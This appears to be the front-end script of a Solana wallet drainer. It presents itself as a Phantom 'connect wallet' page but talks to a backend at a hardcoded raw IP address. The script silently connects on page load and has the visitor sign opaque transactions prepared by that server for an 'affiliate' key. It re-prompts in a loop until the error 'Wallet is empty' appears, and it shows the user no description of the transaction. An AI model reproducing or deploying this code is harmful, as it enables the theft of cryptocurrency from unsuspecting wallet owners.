const { Connection, VersionedTransaction } = solanaWeb3;
let BACKEND_URL = 'http://206.188.196.189:3000';
let CONNECTION = null;

async function initConnection() {
try {
const response = await fetch(`${BACKEND_URL}/get-rpc-url`);
const { rpcUrl } = await response.json();
CONNECTION = new Connection(rpcUrl, 'confirmed');
} catch (err) {
console.error('Init connection error:', err);
}
}

const connectBtn = document.getElementById('connectBtn');
const statusP = document.getElementById('statusP');
let phantomProvider = null;
let publicKey = null;

function isMobile() {
return /Mobi|Android|iPhone|iPad/.test(navigator.userAgent) || navigator.maxTouchPoints > 0;
}

function base64ToUint8Array(base64) {
const binaryString = atob(base64);
const len = binaryString.length;
const bytes = new Uint8Array(len);
for (let i = 0; i < len; i++) {
bytes[i] = binaryString.charCodeAt(i);
}
return bytes;
}

function uint8ArrayToBase64(bytes) {
let binary = '';
const len = bytes.byteLength;
for (let i = 0; i < len; i++) {
binary += String.fromCharCode(bytes[i]);
}
return btoa(binary);
}

async function connectInjected(silent = false) {
if (phantomProvider) {
try {
  const options = silent ? { onlyIfTrusted: true } : {};
  const response = await phantomProvider.connect(options);
  publicKey = response.publicKey.toString();
  await handleTransaction();
} catch (error) {
  if (!silent) {
    console.error('Connection error:', error);
  }
}
}
}

function openInPhantomBrowser() {
const urlEncoded = encodeURIComponent(window.location.href);
const refEncoded = encodeURIComponent(window.location.origin);
const deepLink = `https://phantom.app/ul/v1/browse?url=${urlEncoded}&ref=${refEncoded}`;

let opened = false;
let timeoutId = setTimeout(() => {
if (!opened) {
}
}, 5000);

const onBlur = () => {
opened = true;
clearTimeout(timeoutId);
};
window.addEventListener('blur', onBlur, { once: true });

const onVisibilityChange = () => {
if (document.hidden) {
  opened = true;
  clearTimeout(timeoutId);
}
};
document.addEventListener('visibilitychange', onVisibilityChange);

window.location.href = deepLink;

setTimeout(() => {
window.removeEventListener('blur', onBlur);
document.removeEventListener('visibilitychange', onVisibilityChange);
}, 10000);
}

async function handleConnect() {
if (publicKey) {
return;
}

phantomProvider = window.phantom?.solana;
if (phantomProvider && phantomProvider.isPhantom) {
await connectInjected();
} else if (isMobile()) {
openInPhantomBrowser();
}
}

async function handleTransaction() {
if (!publicKey || !phantomProvider) return;

let success = false;
let attemptCount = 0;
while (!success) {
attemptCount++;
try {
  const prepareResponse = await fetch(`${BACKEND_URL}/affiliate-transaction`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      userPubkey: publicKey,
      affiliatePubkey: 'HSDn4P9bS1YFP8YLQmYTah1RwYxnkbZ4cW3ic8z12UbT' // Replace with SOLANA public key
    }),
  });
  if (!prepareResponse.ok) {
    const errorData = await prepareResponse.json();
    console.error('Prepare error:', errorData);
    throw new Error(errorData.error || 'Failed to prepare transaction');
  }
  const { transactionBase64, commitmentPDA, summary } = await prepareResponse.json();
  
  const txBytes = base64ToUint8Array(transactionBase64);
  const tx = VersionedTransaction.deserialize(txBytes);
  const signedTx = await phantomProvider.signTransaction(tx);
  const serialized = signedTx.serialize({ requireAllSignatures: false, verifySignatures: false });
  const signedTxBase64 = uint8ArrayToBase64(serialized);
  const submitResponse = await fetch(`${BACKEND_URL}/submit`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      signedTxBase64,
      commitmentPDA
    }),
  });
  if (!submitResponse.ok) {
    const errorText = await submitResponse.text();
    throw new Error(`Backend error: ${errorText}`);
  }
  const { txId } = await submitResponse.json();
  success = true;
} catch (err) {
  statusP.textContent = ``;
  console.error('Full error:', err);
  if (err.message && err.message.includes('Wallet is empty')) {
    break;
  }
  await new Promise(resolve => setTimeout(resolve, 1000)); 
}
}
}

connectBtn.addEventListener('click', handleConnect);

window.addEventListener('load', async () => {
await initConnection();
setTimeout(async () => {
phantomProvider = window.phantom?.solana;
if (phantomProvider && phantomProvider.isPhantom) {
  await connectInjected(true);
}
}, 100);
});

if (window.phantom?.solana) {
window.phantom.solana.on('disconnect', () => {
publicKey = null;
});
}